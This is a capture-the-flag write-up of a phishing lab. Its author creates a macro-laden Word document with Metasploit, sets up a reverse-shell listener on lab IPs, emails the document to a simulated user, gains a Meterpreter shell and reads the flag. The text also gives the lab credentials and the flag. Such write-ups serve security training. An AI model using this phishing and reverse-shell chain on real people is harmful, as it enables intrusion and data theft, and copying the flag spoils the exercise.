# (Day 10) - Advent of Cyber

## Creating the Malicious Document

Opening a terminal, we will use Metasploit framework to make our Microsoft document exploit. Using the command: `msfconsole`
Now we receive a Metasploit shell:

![[Pasted image 20241219150337.png]]

Now to obtain the exploit word document we need to run the following commands:

```
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST AttackBox_IP (e.g. '10.4.109.132')
set LPORT 8888
exploit
exit
```

Which will look like this:

![[Pasted image 20241219153006.png]]

#### Creating the Listener

Before we send the document to Marta we need to setup a listener to wait for connection to the IP and correct port. We will also use Metasploit framework, to do this we will run the following commands in the terminal:

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.4.109.132
set LPORT 8888
exploit
```

## Emailing the Malicious Document

We will now head to the website to send emails with the URL http://10.10.110.147.

![[Pasted image 20241219153612.png]]

Now logging in using the following credentials

- Email: `info@socnas.thm`
- Password: `MerryPhishMas!`

We have access to the email client and we can compose and send an email to Marta:

![[Pasted image 20241219154120.png]]

Upon sending the email and waiting a little bit, we see that Marta opens the document because we receive the connection in the listener:

![[Pasted image 20241219154313.png]]

Now we have a shell and by heading to the following directory `C:\Users\Administrator\Desktop` we see the flag and we can print it out:
`THM{PHISHING_CHRISTMAS}`